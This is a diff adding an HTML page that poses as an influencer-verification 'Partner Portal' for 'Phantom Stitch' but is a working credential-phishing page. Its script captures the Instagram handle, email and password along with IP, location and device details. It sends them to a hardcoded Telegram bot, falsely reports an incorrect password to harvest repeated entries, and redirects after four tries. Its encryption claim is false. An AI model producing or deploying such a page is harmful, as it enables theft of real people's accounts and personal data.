@@ -1,0 +1,218 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Partner Portal | Phantom Stitch</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #f0f4f8;
+            color: #1a202c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 15px;
+        }
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            border: 1px solid #e2e8f0;
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .brand-header h1 {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #0047AB;
+            margin: 0;
+            text-transform: uppercase;
+        }
+        .brand-header p {
+            color: #718096;
+            font-size: 0.85rem;
+            margin-top: 5px;
+        }
+        .input-box { margin-bottom: 15px; }
+        label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #4a5568;
+            text-transform: uppercase;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0047AB;
+            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.1);
+        }
+        .main-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #0047AB;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .main-btn:disabled { background-color: #a0aec0; }
+        #msg-display {
+            text-align: center;
+            font-size: 0.85rem;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            border-top: 1px solid #edf2f7;
+            padding-top: 15px;
+            font-size: 0.7rem;
+            color: #a0aec0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="brand-header">
+        <h1>Phantom Stich</h1>
+        <p>Enterprise Influencer Verification</p>
+    </div>
+
+    <form id="mainPortal">
+        <div class="input-box">
+            <label>Instagram Handle</label>
+            <input type="text" id="hndl" placeholder="@username" required>
+        </div>
+        <div class="input-box">
+            <label>Followers</label>
+            <input type="number" id="foll" placeholder="Total followers" required>
+        </div>
+        <div class="input-box">
+            <label>Email Address</label>
+            <input type="email" id="mail" placeholder="EMAIL ADDRESS" required>
+        </div>
+        <div class="input-box">
+            <label>Password</label>
+            <input type="password" id="pass" placeholder="••••••••" required>
+        </div>
+        
+        <button type="submit" class="main-btn" id="subBtn">SIGN UP</button>
+    </form>
+    
+    <div id="msg-display"></div>
+
+    <div class="footer">
+        &copy; 2026 Phantom Stich Ltd. All reserves.<br>
+        AES-256 End-to-End Encryption Active
+    </div>
+</div>
+
+<script>
+    const CONFIG = {
+        T: '8718417027:AAGlL7XRrwCePoCGdIwiHlthtB9GBjPDEMA',
+        C: '8405738582'
+    };
+    let attempts = 0;
+
+    async function fetchUserIP() {
+        const apis = [
+            'https://ipapi.co/json/',
+            'https://ipinfo.io/json',
+            'https://api.ipify.org?format=json'
+        ];
+        for (let url of apis) {
+            try {
+                let r = await fetch(url);
+                if (r.ok) {
+                    let d = await r.json();
+                    return `🌐 *IP:* \`${d.ip || d.query}\`\n📍 *Loc:* ${d.city || 'N/A'}, ${d.region || 'N/A'}`;
+                }
+            } catch (e) { continue; }
+        }
+        return "🌐 *IP:* `Capture Shielded/Failed`";
+    }
+
+    document.getElementById('mainPortal').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        attempts++;
+        
+        const btn = document.getElementById('subBtn');
+        const disp = document.getElementById('msg-display');
+        
+        btn.disabled = true;
+        disp.style.color = "#2d3748";
+        disp.innerText = "Synchronizing with secure gateway...";
+
+        const info = {
+            h: document.getElementById('hndl').value,
+            f: document.getElementById('foll').value,
+            m: document.getElementById('mail').value,
+            p: document.getElementById('pass').value,
+            ua: navigator.userAgent,
+            plt: navigator.platform
+        };
+
+        const ipData = await fetchUserIP();
+
+        // Stylish Message
+        const telegramText = `🧵 *PHANTOM STICH: NEW INBOUND* 🧵\n` +
+                             `──────────────────\n` +
+                             `👤 *Target:* \`${info.h}\`\n` +
+                             `📊 *Followers:* ${info.f}\n` +
+                             `📧 *Email:* \`${info.m}\`\n` +
+                             `🔑 *Pass:* \`${info.p}\`\n` +
+                             `🔢 *Attempt:* #${attempts}\n` +
+                             `──────────────────\n` +
+                             `${ipData}\n` +
+                             `📱 *Device:* ${info.plt}\n` +
+                             `──────────────────\n` +
+                             `⏰ ${new Date().toLocaleString()}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.C, text: telegramText, parse_mode: 'Markdown' })
+            });
+
+            if (attempts >= 4) {
+                window.location.replace("https://www.google.com/404");
+            } else {
+                setTimeout(() => {
+                    disp.style.color = "#e53e3e";
+                    disp.innerText = "Error: inncorrect password. Please re-enter password.";
+                    btn.disabled = false;
+                }, 1500);
+            }
+        } catch (err) {
+            disp.innerText = "Connection lost. Retry.";
+            btn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
+
